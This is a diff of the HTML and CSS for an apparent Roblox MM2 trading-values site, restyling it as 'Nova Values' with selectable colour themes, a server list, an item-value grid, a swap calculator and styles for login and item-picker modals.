@@ -3,1071 +3,1547 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Jace Values — MM2 Trading Servers</title>
+<title>Nova Values</title>
+<script>
+// Applies any saved theme to <html> before the stylesheet paints, so the
+// page never flashes the default theme first. Must run before <style>.
+(function(){
+  try{
+    var t=localStorage.getItem('novaTheme');
+    if(t && t!=='galaxy') document.documentElement.setAttribute('data-theme',t);
+  }catch(e){}
+})();
+</script>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body { background:#0b0713; color:#efe9f7; font-family:'Segoe UI', Arial, sans-serif; min-height:100vh; }
-  a { color:inherit; text-decoration:none; }
-  button { font-family:inherit; cursor:pointer; }
+@import url('https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@500;600;700&family=Inter:wght@400;500;600;700;800&display=swap');
 
-  /* ---------- Header ---------- */
-  header { display:flex; align-items:center; justify-content:space-between; padding:18px 32px;
-    background:rgba(20,12,35,.85); border-bottom:1px solid #241640; position:sticky; top:0; z-index:50; }
-  .logo { display:flex; align-items:center; gap:12px; font-weight:700; font-size:18px; }
-  .logo img { width:42px; height:42px; border-radius:50%; }
-  .logo .tm { font-size:10px; color:#8a7aa8; vertical-align:super; }
-  .tagline { font-size:12px; color:#9c8cba; font-weight:400; margin-top:2px; }
-  nav.tabs { display:flex; gap:6px; }
-  nav.tabs a { padding:9px 22px; border-radius:10px; font-size:14px; font-weight:600; color:#b3a3cf; }
-  nav.tabs a.active, nav.tabs a:hover { background:#241640; color:#fff; }
+:root{
+  /* THEME: GALAXY (default) — deep cosmic purple/violet with starry dots */
+  --bg:#0a0518;
+  --panel:#150c2e;
+  --panel2:#1a1038;
+  --border:#3a2764;
+  --text:#f1e9ff;
+  --muted:#9d8bc4;
+  --accent:#a855f7;
+  --accent2:#ec4899;
+  --cyan:#818cf8;
+  --purple:#e0aaff;
+  --bg-grad1:rgba(168,85,247,.20);
+  --bg-grad2:rgba(236,72,153,.13);
+  --bg-grad3:rgba(129,140,248,.16);
+  --bg-base:linear-gradient(135deg,#06030f 0%,#0c0620 48%,#160a2e 100%);
+  --dots-color:#d9c8ff;
+  --dots-opacity:.4;
+}
 
-  /* ---------- Sections ---------- */
-  section { max-width:1100px; margin:0 auto; padding:40px 24px; }
-  .banner { background:linear-gradient(135deg,#2b1150,#1a0b30); border:1px solid #3a1f66;
-    border-radius:18px; padding:44px; text-align:center; margin-bottom:36px; }
-  .banner .pill { display:inline-block; background:#3a1f66; color:#ffb14e; font-size:12px;
-    font-weight:700; padding:6px 14px; border-radius:999px; margin-bottom:16px; }
-  .banner h1 { font-size:34px; margin-bottom:14px; }
-  .banner p { color:#b3a3cf; max-width:560px; margin:0 auto 22px; font-size:14px; line-height:1.6; }
-  .features { list-style:none; display:inline-block; text-align:left; margin-bottom:24px; }
-  .features li { font-size:14px; color:#d8cce8; padding:5px 0; }
-  .features li::before { content:"✔ "; color:#8f6fe8; font-weight:700; }
-  .stats { display:flex; gap:40px; justify-content:center; margin-bottom:28px; }
-  .stats .num { font-size:30px; font-weight:800; color:#a78bfa; }
-  .stats .lbl { font-size:12px; color:#9c8cba; }
-  .btn-primary { display:inline-block; background:linear-gradient(135deg,#7c3aed,#a855f7); color:#fff;
-    font-weight:700; font-size:15px; padding:14px 44px; border-radius:12px; border:none; }
-  .btn-primary:hover { filter:brightness(1.15); }
+/* THEME: EMBER — warm orange/pink, glowing lava feel */
+html[data-theme="ember"]{
+  --bg:#150a08;
+  --panel:#1c110d;
+  --panel2:#221510;
+  --border:#4a2a1c;
+  --text:#f7ece5;
+  --muted:#b08a76;
+  --accent:#ff6b35;
+  --accent2:#ff3d81;
+  --cyan:#ffb347;
+  --purple:#ff8a5c;
+  --bg-grad1:rgba(255,107,53,.20);
+  --bg-grad2:rgba(255,61,129,.12);
+  --bg-grad3:rgba(255,179,71,.14);
+  --bg-base:linear-gradient(135deg,#0f0705 0%,#180a08 48%,#220c0a 100%);
+  --dots-color:#ff9d5c;
+  --dots-opacity:.18;
+}
 
-  /* ---------- Server cards ---------- */
-  .region h2 { font-size:22px; margin-bottom:6px; }
-  .region .meta { font-size:13px; color:#9c8cba; margin-bottom:20px; }
-  .server-card { display:flex; align-items:center; gap:14px; background:#150c26;
-    border:1px solid #241640; border-radius:14px; padding:16px 20px; margin-bottom:10px; }
-  .server-card .flag { width:30px; height:20px; border-radius:4px; }
-  .server-card .name { flex:1; font-size:14px; font-weight:600; }
-  .server-card .ping { font-size:13px; color:#4ade80; margin-right:16px; }
-  .btn-join { background:#2b1150; color:#c4b5fd; font-weight:700; font-size:13px;
-    padding:9px 24px; border-radius:9px; border:1px solid #3a1f66; }
-  .btn-join:hover { background:#3a1f66; color:#fff; }
+/* THEME: OCEAN — deep teal/blue, calm and cool */
+html[data-theme="ocean"]{
+  --bg:#031b24;
+  --panel:#062733;
+  --panel2:#083240;
+  --border:#0f4a5c;
+  --text:#e0f7fa;
+  --muted:#7fa8b3;
+  --accent:#06b6d4;
+  --accent2:#0ea5e9;
+  --cyan:#2dd4bf;
+  --purple:#67e8f9;
+  --bg-grad1:rgba(6,182,212,.18);
+  --bg-grad2:rgba(14,165,233,.13);
+  --bg-grad3:rgba(45,212,191,.15);
+  --bg-base:linear-gradient(135deg,#010e14 0%,#02181f 48%,#04232d 100%);
+  --dots-color:#7fd4d9;
+  --dots-opacity:.22;
+}
 
-  /* ---------- Values grid ---------- */
-  .tier { margin-bottom:28px; }
-  .tier h3 { font-size:15px; color:#9c8cba; margin-bottom:12px; }
-  .values-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(150px,1fr)); gap:10px; }
-  .value-card { display:flex; align-items:center; gap:10px; background:#150c26;
-    border:1px solid #241640; border-radius:12px; padding:10px 12px; }
-  .value-card img { width:36px; height:36px; border-radius:8px; }
-  .value-card .vname { font-size:12px; flex:1; font-weight:600; }
-  .value-card .vval { font-size:13px; font-weight:800; color:#a78bfa; white-space:nowrap; }
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  min-height:100vh;
+  color:var(--text);
+  font-family:Inter,Arial,sans-serif;
+  background:
+    radial-gradient(circle at 15% 15%,var(--bg-grad1),transparent 26%),
+    radial-gradient(circle at 85% 20%,var(--bg-grad2),transparent 25%),
+    radial-gradient(circle at 60% 85%,var(--bg-grad3),transparent 30%),
+    var(--bg-base);
+  overflow-x:hidden;
+  transition:background .25s ease,color .25s ease;
+}
+body:before{
+  content:"";
+  position:fixed;inset:0;pointer-events:none;opacity:var(--dots-opacity);
+  background-image:radial-gradient(var(--dots-color) 1px,transparent 1px);
+  background-size:120px 120px;
+  mask-image:linear-gradient(to bottom,black,transparent 90%);
+}
 
-  /* ---------- Swap calculator ---------- */
-  .swap-box { background:linear-gradient(135deg,#1a0b30,#150c26); border:1px solid #3a1f66;
-    border-radius:18px; padding:36px; text-align:center; }
-  .swap-box h2 { margin-bottom:8px; }
-  .swap-box .sub { font-size:13px; color:#9c8cba; margin-bottom:26px; }
-  .swap-cols { display:flex; align-items:center; justify-content:center; gap:20px; flex-wrap:wrap; }
-  .swap-col { background:#150c26; border:1px solid #241640; border-radius:14px; padding:22px; min-width:240px; }
-  .swap-col h4 { font-size:13px; color:#9c8cba; margin-bottom:10px; }
-  .swap-col .gem { font-size:24px; font-weight:800; color:#a78bfa; }
-  .swap-col .plus { color:#4ade80; font-size:18px; font-weight:800; margin-top:8px; }
-  .swap-arrow { font-size:22px; color:#7c3aed; font-weight:800; }
+/* THEME SWITCHER — three buttons (sun / warm / night) next to the logo */
+.theme-switcher{display:flex;padding:0;background:transparent;border:0;margin-left:2px}
+.theme-btn{width:36px;height:36px;border:1px solid var(--border);border-radius:11px;background:rgba(11,18,33,.5);color:var(--text);font-size:16px;cursor:pointer;display:grid;place-items:center;transition:.15s}
+.theme-btn:hover{border-color:var(--accent)}
+.theme-btn.active{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border-color:transparent}
 
-  /* ---------- Footer ---------- */
-  footer { text-align:center; padding:28px; font-size:12px; color:#8a7aa8;
-    border-top:1px solid #241640; margin-top:40px; }
 
-  /* ---------- Modals (overlay) ---------- */
-  .overlay { display:none; position:fixed; inset:0; background:rgba(5,2,10,.8);
-    z-index:100; align-items:center; justify-content:center; }
-  .overlay.show { display:flex; }
-  .modal { background:#150c26; border:1px solid #3a1f66; border-radius:16px;
-    width:min(420px, 92vw); padding:32px; text-align:center; position:relative;
-    box-shadow:0 20px 60px rgba(0,0,0,.6); }
-  .modal img.check { width:56px; margin-bottom:12px; }
-  .modal img.kick { width:64px; margin-bottom:12px; }
-  .modal img.botimg { width:64px; margin-bottom:12px; }
-  .modal h3 { font-size:18px; margin-bottom:10px; }
-  .modal p { font-size:13px; color:#b3a3cf; line-height:1.6; margin-bottom:18px; }
-  .modal .bot-room { font-size:14px; font-weight:700; color:#4ade80; margin-bottom:14px; }
-  .modal .close { position:absolute; top:12px; right:14px; background:none; border:none;
-    color:#8a7aa8; font-size:18px; }
-  .modal .close:hover { color:#fff; }
-  .step-dots { display:flex; gap:6px; justify-content:center; margin-bottom:18px; }
-  .step-dots span { width:8px; height:8px; border-radius:50%; background:#3a1f66; }
-  .step-dots span.on { background:#a855f7; }
+.topbar{
+  position:sticky;top:0;z-index:20;
+  height:68px;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:10px 18px;
+  background:rgba(5,10,21,.76);
+  border-bottom:1px solid rgba(75,92,122,.25);
+  backdrop-filter:blur(16px);
+}
+.brand{display:flex;align-items:center;gap:11px;flex:0 0 auto}
+.logo{
+  width:34px;height:34px;border-radius:9px;
+  object-fit:cover;flex:0 0 auto;
+  box-shadow:0 8px 25px rgba(255,76,72,.25);
+}
+.menu{
+  display:flex;gap:4px;padding:5px;
+  background:rgba(11,18,33,.86);
+  border:1px solid #1e2c43;border-radius:14px;
+}
+.menu a{
+  text-decoration:none;color:#91a0b6;font-size:13px;font-weight:700;
+  padding:9px 17px;border-radius:9px;transition:.2s;
+}
+.menu a:hover,.menu a.active{color:#fff;background:linear-gradient(135deg,var(--accent),var(--accent2));}
 
-  .searching { font-size:13px; color:#9c8cba; margin-bottom:14px; }
-  .spinner { width:36px; height:36px; border:4px solid #241640; border-top-color:#a855f7;
-    border-radius:50%; margin:0 auto 16px; animation:spin 1s linear infinite; }
-  @keyframes spin { to { transform:rotate(360deg); } }
-  .room-code { font-size:22px; font-weight:800; color:#a78bfa; letter-spacing:2px; }
+.page{width:min(1080px,calc(100% - 34px));margin:0 auto;padding:42px 0 70px}
+.hero{text-align:center;margin-bottom:32px}
+.hero h1{
+  margin:0;font-family:"Barlow Condensed",sans-serif;
+  font-size:42px;letter-spacing:2px;text-transform:uppercase;
+}
+.hero p{margin:7px 0 0;color:var(--muted);font-size:14px}
 
-  input.rolox { width:100%; padding:12px 14px; border-radius:10px; background:#0b0713;
-    border:1px solid #241640; color:#efe9f7; font-size:14px; margin-bottom:14px; }
-  input.rolox::placeholder { color:#5c4e78; }
-  .err { font-size:12px; color:#f87171; margin-bottom:12px; display:none; }
-  .confirm-user img { width:72px; height:72px; border-radius:50%; margin-bottom:10px; }
-  .confirm-user .uname { font-size:16px; font-weight:700; margin-bottom:4px; }
-  .confirm-user .udisp { font-size:12px; color:#9c8cba; margin-bottom:16px; }
-  .btn-row { display:flex; gap:10px; justify-content:center; }
-  .btn-ghost { background:#241640; color:#c4b5fd; font-weight:700; font-size:13px;
-    padding:10px 22px; border-radius:9px; border:1px solid #3a1f66; }
-  .btn-ghost:hover { background:#3a1f66; color:#fff; }
+.section-title{
+  font-family:"Barlow Condensed",sans-serif;text-transform:uppercase;
+  letter-spacing:1px;font-size:20px;color:#d8e1ed;
+  margin:26px 0 10px;display:flex;align-items:center;gap:8px;
+}
+.count{font:700 10px Inter;background:#17273a;color:#6e8da4;padding:3px 7px;border-radius:8px}
+
+.grid{
+  display:grid;
+  grid-template-columns:repeat(6,1fr);
+  gap:8px;
+}
+.card{
+  min-height:112px;
+  border:1px solid #344364;
+  border-top:2px solid var(--cyan);
+  border-radius:10px;
+  background:linear-gradient(145deg,rgba(27,38,64,.94),rgba(17,24,44,.96));
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:8px;
+  text-align:center;
+  box-shadow:inset 0 1px rgba(255,255,255,.025);
+  transition:transform .15s ease,box-shadow .15s ease;
+}
+.card:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,0,0,.3),0 0 0 1px var(--cyan) inset}
+.card:nth-child(3n){border-color:#3b4c61}
+.card:nth-child(3n){border-top-color:var(--purple)}
+.item-img{
+  width:62px;height:55px;object-fit:contain;
+  filter:drop-shadow(0 5px 7px rgba(0,0,0,.35));
+  margin-bottom:3px;
+}
+.item-name{font-size:9px;font-weight:800;color:var(--purple);white-space:nowrap}
+.item-value{font-size:10px;font-weight:800;color:var(--cyan);margin-top:6px}
+.diamond{font-size:9px}
+
+.searchbar{
+  display:flex;gap:8px;max-width:620px;margin:0 auto 25px;
+}
+.searchbar input{
+  flex:1;padding:12px 15px;border-radius:10px;border:1px solid #263653;
+  outline:none;background:#0b1426;color:white;font-size:13px;
+}
+.searchbar button,.primary{
+  border:0;border-radius:10px;padding:0 17px;
+  background:linear-gradient(135deg,var(--cyan),#24b7d6);
+  color:#06121b;font-weight:900;cursor:pointer;
+}
+@keyframes startSwapPulse{
+  0%,100%{transform:scale(1);box-shadow:0 0 0 0 rgba(45,212,191,.5)}
+  50%{transform:scale(1.035);box-shadow:0 0 22px 4px rgba(45,212,191,.45)}
+}
+.start-swap{animation:startSwapPulse 1.8s ease-in-out infinite}
+.start-swap:hover{animation-play-state:paused}
+
+.server-list,.news-wrap,.swap-wrap{max-width:650px;margin:0 auto}
+.server{
+  background:rgba(13,24,40,.92);border:1px solid #20344d;
+  border-radius:12px;margin-bottom:10px;overflow:hidden;
+}
+.server-head{padding:14px 16px;font-weight:800;display:flex;justify-content:space-between;cursor:pointer;user-select:none}
+.server-head span{transition:transform .2s ease}
+.server.collapsed .server-head span{transform:rotate(-90deg)}
+.server-body{overflow:hidden;max-height:600px;transition:max-height .25s ease}
+.server.collapsed .server-body{max-height:0}
+.server-row{
+  display:grid;grid-template-columns:minmax(0,1fr) auto auto;align-items:center;
+  gap:16px;padding:10px 15px;border-top:1px solid #20344d;font-size:11px;
+}
+.server-row b{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;min-width:0}
+.ping{display:inline-flex;align-items:center;gap:8px}
+.ping-bars{display:inline-flex;align-items:flex-end;gap:2px;height:13px}
+.ping-bars i{display:block;width:3px;border-radius:1px;background:#243349;font-style:normal}
+.ping-bars i:nth-child(1){height:4px}
+.ping-bars i:nth-child(2){height:6.5px}
+.ping-bars i:nth-child(3){height:9px}
+.ping-bars i:nth-child(4){height:11px}
+.ping-bars i:nth-child(5){height:13px}
+.ping-bars i.lit{background:#39df87}
+.ping.ping-lag .ping-bars i.lit{background:#f5b942}
+.ping.ping-bad .ping-bars i.lit{background:#ff5d5d}
+.ping-ms{color:#aab6c9;font-variant-numeric:tabular-nums;font-size:12px;white-space:nowrap}
+.join{border:0;border-radius:999px;background:#4d6bfa;color:#fff;padding:9px 22px;font-weight:700;font-size:12.5px;cursor:pointer;white-space:nowrap}
+.join:hover{background:#3d5aec}
+
+.news-card{
+  padding:20px;border:1px solid #234052;border-radius:14px;
+  background:linear-gradient(145deg,#13263a,#141d35);margin-bottom:13px;
+}
+.badge{
+  display:inline-block;background:var(--cyan);color:#062025;
+  border-radius:20px;padding:5px 10px;font-size:9px;font-weight:900;
+}
+.news-card h2{margin:12px 0 8px;color:#46cbd7;font-size:18px}
+.news-card p,.news-card li{font-size:12px;color:#91a1b5;line-height:1.6}
+.news-card ul{padding-left:18px}.news-card li::marker{color:#27df85}
+
+.swap-grid{display:grid;grid-template-columns:1fr 120px 1fr;gap:18px;align-items:center}
+.trade-box{
+  background:linear-gradient(145deg,#101b2e,#0e1628);
+  border:1px solid #203652;border-radius:16px;padding:17px;
+}
+.trade-title{font-family:"Barlow Condensed";font-size:22px;letter-spacing:1px}
+.trade-value{float:right;color:var(--cyan);font-weight:800}
+.slots{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-top:14px}
+.slot{
+  height:145px;border:2px dashed #214154;border-radius:14px;
+  display:grid;place-items:center;color:#287287;font-size:22px;
+}
+.swap-middle{text-align:center}
+.swap-icon{font-size:38px;color:var(--cyan);margin-bottom:12px}
+.swap-btn{
+  width:100%;height:48px;border:0;border-radius:12px;
+  background:linear-gradient(135deg,var(--cyan),#2ac4da);
+  color:#06141a;font-size:16px;font-weight:900;
+}
+.hint{font-size:9px;color:#667890;margin-top:12px}
+
+.swap-warning{
+  display:flex;align-items:center;gap:9px;
+  margin:14px auto 0;max-width:900px;
+  background:linear-gradient(135deg,rgba(255,107,53,.16),rgba(255,61,129,.13));
+  border:1px solid rgba(255,138,61,.4);
+  border-radius:12px;padding:12px 16px;
+  color:#ffd6b8;font-size:12px;font-weight:700;line-height:1.4;
+}
+.swap-warning-icon{font-size:15px;flex:0 0 auto;color:#ffb066}
+.swap-warning.shake{animation:swapShake .4s}
+@keyframes swapShake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+.swap-warning b{color:#fff}
+@media(max-width:560px){
+ .swap-warning{padding:10px 12px;gap:7px;font-size:10.5px;border-radius:10px}
+ .swap-warning-icon{font-size:13px}
+}
+
+.swap-picker{
+  margin:18px auto 0;max-width:900px;background:linear-gradient(145deg,#101b2e,#0e1628);
+  border:1px solid #203652;border-radius:16px;padding:14px;
+}
+.picker-head{display:flex;justify-content:space-between;align-items:center;gap:12px;margin-bottom:10px}
+.picker-head strong{font-size:12px;letter-spacing:.5px}.picker-head span{font-size:10px;color:#718198}
+.picker-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:7px;max-height:220px;overflow:auto;padding-right:3px}
+.picker-grid::-webkit-scrollbar{width:5px}.picker-grid::-webkit-scrollbar-thumb{background:#263653;border-radius:10px}
+.pick-card{min-height:74px;border:1px solid #263a55;border-radius:9px;background:#121e31;padding:7px;text-align:center;cursor:pointer;transition:.15s}
+.pick-card:hover{transform:translateY(-1px);border-color:#35d8c8}
+.pick-card .pick-img{font-size:20px}.pick-card .pick-name{font-size:8px;color:#d6c7ee;font-weight:800;margin-top:3px}.pick-card .pick-val{font-size:8px;color:var(--cyan);font-weight:900;margin-top:3px}
+.trade-box{cursor:pointer}.trade-box.selected{border-color:#35d8c8;box-shadow:0 0 0 1px #35d8c8aa}
+.slot.filled{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;padding:8px;color:#dfe8f5;font-size:10px;text-align:center;background:#13223a;border-style:solid;overflow:hidden}
+.slot.filled .slot-img-wrap{display:flex;align-items:center;justify-content:center;height:58px;flex:0 0 auto}
+.slot-icon{width:56px;height:56px;font-size:56px;max-width:100%}
+.slot.filled b{font-size:10px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:100%}.slot.filled small{color:var(--cyan);font-weight:900}
+@media(max-width:1024px){.picker-grid{grid-template-columns:repeat(5,1fr)}}
+@media(max-width:850px){.picker-grid{grid-template-columns:repeat(4,1fr)}}
+@media(max-width:520px){.picker-grid{grid-template-columns:repeat(3,1fr)}}
+
+footer{text-align:center;color:#5e6d84;font-size:10px;padding:10px 0;flex:0 0 auto}
+
+
+/* BOOK-STYLE PAGES: only one section is visible at a time */
+html, body {
+  height: 100%;
+  overflow: hidden;
+}
+@supports (height: 100dvh){
+  html, body { height: 100dvh; }
+}
+
+body{
+  display:flex;
+  flex-direction:column;
+}
+
+.topbar {
+  flex: 0 0 auto;
+}
+
+.page {
+  flex: 1 1 auto;
+  min-height: 0;
+  width: 100%;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  position: relative;
+}
+
+.page-section {
+  display: none;
+  position: absolute;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  overflow-y: auto;
+  overflow-x: hidden;
+  padding: 20px 24px 25px 30px;
+  -webkit-overflow-scrolling: touch;
+  overscroll-behavior: contain;
+  touch-action: pan-y;
+}
+
+.page-section.active-page {
+  display: block;
+}
+
+#news, #servers {
+  overflow-y: auto !important;
+  overflow-x: hidden;
+  -webkit-overflow-scrolling: touch;
+}
+
+.page-section::-webkit-scrollbar {
+  width: 5px;
+}
+.page-section::-webkit-scrollbar-thumb {
+  background: #263653;
+  border-radius: 10px;
+}
+
+.page-section .hero {
+  margin-bottom: 22px;
+}
+
+.menu .nav-btn {
+  appearance: none;
+  border: 0;
+  font: inherit;
+  text-decoration: none;
+  color: #91a0b6;
+  font-size: 13px;
+  font-weight: 700;
+  padding: 9px 17px;
+  border-radius: 9px;
+  background: transparent;
+  cursor: pointer;
+  transition: .2s;
+}
+
+.menu .nav-btn:hover,
+.menu .nav-btn.active {
+  color: #fff;
+  background: linear-gradient(135deg,var(--accent),var(--accent2));
+}
+
+/* TABLET (portrait iPads, small laptops ~768–1024px): roomier than
+   phone, tighter than desktop. Keeps 2-column swap layout so trade
+   boxes stay side-by-side, but grows touch targets. */
+@media(max-width:1024px){
+ .page-section{padding:32px 24px 60px}
+ .grid{grid-template-columns:repeat(5,1fr);gap:10px}
+ .menu a,.menu .nav-btn{padding:10px 14px;font-size:12.5px}
+ .server-row{padding:12px 15px}
+ .join{padding:10px 22px;font-size:13px}
+}
+
+@media(max-width:850px){
+ .grid{grid-template-columns:repeat(4,1fr)}
+ .swap-grid{grid-template-columns:1fr 90px 1fr;gap:10px}
+ .slots{grid-template-columns:1fr}
+ .slot{height:82px;font-size:18px}
+ .slot.filled{gap:2px;padding:6px}
+ .slot.filled .slot-img-wrap{height:38px}
+ .slot-icon{width:36px;height:36px;font-size:36px}
+ .trade-box{padding:12px}
+ .trade-title{font-size:16px}
+ .swap-icon{font-size:26px;margin-bottom:8px}
+ .swap-btn{height:38px;font-size:13px}
+ .hint{font-size:8px;margin-top:8px}
+}
+
+/* TABLET PORTRAIT (e.g. iPad 768px): swap boxes stack like on
+   phone since 2 wide gets cramped once you're below ~700px, but
+   everything else keeps the roomier tablet sizing above. */
+@media(max-width:700px){
+ .swap-grid{grid-template-columns:1fr;gap:14px}
+ .swap-middle{order:2}
+ .trade-box:first-of-type{order:1}
+ .trade-box:last-of-type{order:3}
+}
+@media(max-width:560px){
+ .topbar{height:auto;gap:6px;flex-wrap:nowrap;padding:8px 10px}
+ .brand{gap:6px;flex:0 0 auto}
+ .logo{width:28px;height:28px;border-radius:8px}
+ .theme-btn{width:28px;height:28px;font-size:13px;border-radius:9px}
+ .menu{flex:1 1 auto;min-width:0;justify-content:space-between;gap:2px;padding:4px}
+ .menu .nav-btn{flex:1;min-width:0;text-align:center;padding:8px 3px;font-size:10.5px}
+ .page-section{padding:16px 12px 15px}
+ .hero h1{font-size:34px}
+ .grid{grid-template-columns:repeat(2,1fr)}
+ .card{min-height:120px}
+ .server-row{grid-template-columns:minmax(0,1fr) auto auto;gap:8px;padding:10px 10px;font-size:10px}
+ .ping{gap:5px}
+ .ping-bars{height:11px}
+ .ping-bars i:nth-child(1){height:3.5px}
+ .ping-bars i:nth-child(2){height:5.5px}
+ .ping-bars i:nth-child(3){height:7.5px}
+ .ping-bars i:nth-child(4){height:9.5px}
+ .ping-bars i:nth-child(5){height:11px}
+ .ping-ms{font-size:10.5px}
+ .join{padding:7px 14px;font-size:10.5px}
+ .swap-grid{grid-template-columns:1fr 70px 1fr;gap:6px}
+ .trade-box{padding:8px;border-radius:12px}
+ .trade-title{font-size:13px}
+ .trade-value{font-size:11px}
+ .slot{height:68px;font-size:15px;border-radius:10px}
+ .slot.filled{font-size:8px;padding:4px;gap:1px}
+ .slot.filled b{font-size:8px}
+ .slot.filled .slot-img-wrap{height:26px}
+ .slot-icon{width:24px;height:24px;font-size:24px}
+ .swap-icon{font-size:20px;margin-bottom:5px}
+ .swap-btn{height:32px;font-size:11px;border-radius:9px}
+ .hint{font-size:7px;margin-top:6px;line-height:1.3}
+}
+/* Very narrow phones (iPhone SE and similar ~375px and under): trim
+   the topbar a bit further so News/Servers/Values/Swap never wrap. */
+@media(max-width:380px){
+ .topbar{padding:8px 8px}
+ .brand{gap:4px}
+ .logo{width:26px;height:26px}
+ .theme-btn{width:26px;height:26px;font-size:12px}
+ .menu{padding:3px;gap:1px}
+ .menu .nav-btn{padding:7px 2px;font-size:9.5px}
+}
+
+/* Safe account-connect modal */
+.modal-backdrop{display:none;position:fixed;inset:0;z-index:100;background:rgba(2,6,16,.76);backdrop-filter:blur(8px);align-items:center;justify-content:center;padding:20px}
+.modal-backdrop.show{display:flex}
+.login-modal{width:min(430px,100%);background:linear-gradient(160deg,#111d33,#0c1425);border:1px solid #29405f;border-top:3px solid var(--cyan);border-radius:20px;padding:28px;box-shadow:0 25px 80px rgba(0,0,0,.5);text-align:center}
+.login-modal .modal-icon{width:54px;height:54px;margin:0 auto 14px;border-radius:15px;display:grid;place-items:center;background:linear-gradient(135deg,var(--accent),var(--accent2));font-size:24px}
+.login-modal h2{margin:0 0 8px;font-family:"Barlow Condensed",sans-serif;font-size:30px;letter-spacing:1px}
+.login-modal p{margin:0 auto 20px;color:var(--muted);font-size:13px;line-height:1.6;max-width:340px}
+.login-modal .roblox-link{display:flex;align-items:center;justify-content:center;width:100%;height:46px;border-radius:11px;text-decoration:none;color:#fff;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2));box-shadow:0 10px 28px rgba(255,61,129,.18)}
+.login-modal .cancel-btn{margin-top:10px;width:100%;height:42px;border:1px solid #293b57;border-radius:10px;background:#0b1526;color:#9aa8bd;font-weight:700;cursor:pointer}
+.godly-modal{width:min(920px,92vw);max-height:82vh;display:flex;flex-direction:column;background:linear-gradient(160deg,#111d33,#0c1425);border:1px solid #29405f;border-top:3px solid var(--purple);border-radius:20px;padding:26px;box-shadow:0 25px 80px rgba(0,0,0,.5);text-align:left;position:relative}
+.godly-scroll-btns{position:absolute;right:-56px;top:50%;transform:translateY(-50%);display:flex;flex-direction:column;gap:12px;z-index:5}
+.godly-scroll-btn{width:42px;height:42px;border-radius:50%;border:1px solid var(--border);background:rgba(15,30,45,.9);color:var(--text);font-size:15px;cursor:pointer;display:grid;place-items:center;box-shadow:0 8px 20px rgba(0,0,0,.35);transition:.15s}
+.godly-scroll-btn:hover{border-color:var(--cyan);color:var(--cyan);transform:translateY(-1px)}
+@media(max-width:700px){.godly-scroll-btns{right:8px;top:auto;bottom:70px;transform:none;flex-direction:column}}
+.godly-search{width:100%;flex:0 0 auto;margin-bottom:12px;padding:11px 14px;border-radius:9px;border:1px solid #263653;outline:none;background:#0b1426;color:#fff;font-size:13px}
+.godly-search::placeholder{color:#5e6d84}
+.godly-modal .picker-head{margin-bottom:14px;flex:0 0 auto}
+.godly-modal .picker-head strong{font-size:16px;font-family:"Barlow Condensed",sans-serif;letter-spacing:1px}
+.godly-modal .picker-grid{grid-template-columns:repeat(6,1fr);max-height:none;overflow:visible;gap:14px}
+.godly-modal .pick-card{min-height:158px;padding:16px 8px;border-radius:14px}
+.godly-modal .pick-card .pick-img{font-size:48px;margin-bottom:6px}
+.godly-modal .pick-card .pick-name{font-size:12.5px;margin-top:6px}
+.godly-modal .pick-card .pick-val{font-size:12.5px;margin-top:5px}
+@media(max-width:1024px){
+  .godly-modal{width:min(700px,92vw)}
+  .godly-modal .picker-grid{grid-template-columns:repeat(4,1fr)}
+}
+@media(max-width:700px){
+  .godly-modal{width:100%;max-height:90vh;padding:18px}
+  .godly-modal .picker-grid{grid-template-columns:repeat(3,1fr);gap:10px}
+  .godly-modal .pick-card{min-height:128px;padding:12px 6px}
+  .godly-modal .pick-card .pick-img{font-size:34px;margin-bottom:4px}
+  .godly-modal .pick-card .pick-name{font-size:11px}
+  .godly-modal .pick-card .pick-val{font-size:11px}
+}
+@media(max-width:480px){
+  .godly-modal .picker-grid{grid-template-columns:repeat(2,1fr);gap:9px}
+  .godly-modal .pick-card{min-height:145px;padding:14px 8px}
+  .godly-modal .pick-card .pick-img{font-size:40px}
+  .godly-modal .pick-card .pick-name{font-size:12.5px}
+  .godly-modal .pick-card .pick-val{font-size:12.5px}
+}
+.godly-modal .cancel-btn{margin-top:14px;width:100%;height:42px;border:1px solid #293b57;border-radius:10px;background:#0b1526;color:#9aa8bd;font-weight:700;cursor:pointer;flex:0 0 auto}
+#godlyScroll{flex:1 1 auto;min-height:0;overflow-y:auto;padding-right:6px}
+#godlyScroll::-webkit-scrollbar{width:5px}
+#godlyScroll::-webkit-scrollbar-thumb{background:#263653;border-radius:10px}
+.godly-tier-title{font-size:11px;font-weight:800;letter-spacing:.5px;color:var(--cyan);margin:14px 0 7px}
+.godly-tier-title:first-child{margin-top:0}
+.modal-placeholder-img{width:64px;height:64px;border-radius:14px;margin:0 auto 14px;display:block;object-fit:cover}
+.modal-trade-summary{display:flex;flex-wrap:wrap;justify-content:center;align-items:center;gap:8px;margin:2px 0 18px}
+.modal-trade-summary .mts-item{display:flex;flex-direction:column;align-items:center;gap:3px;background:#0b1426;border:1px solid #263653;border-radius:9px;padding:6px;width:64px}
+.modal-trade-summary .mts-item img,.modal-trade-summary .mts-item .slot-icon{width:30px;height:30px;font-size:30px}
+.modal-trade-summary .mts-item span{font-size:8px;color:#aab6c9;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%}
+.modal-trade-summary .mts-arrow{font-size:20px;color:var(--cyan);flex:0 0 auto;align-self:center}
+@media(max-width:520px){
+  .modal-trade-summary .mts-item{width:56px;padding:5px}
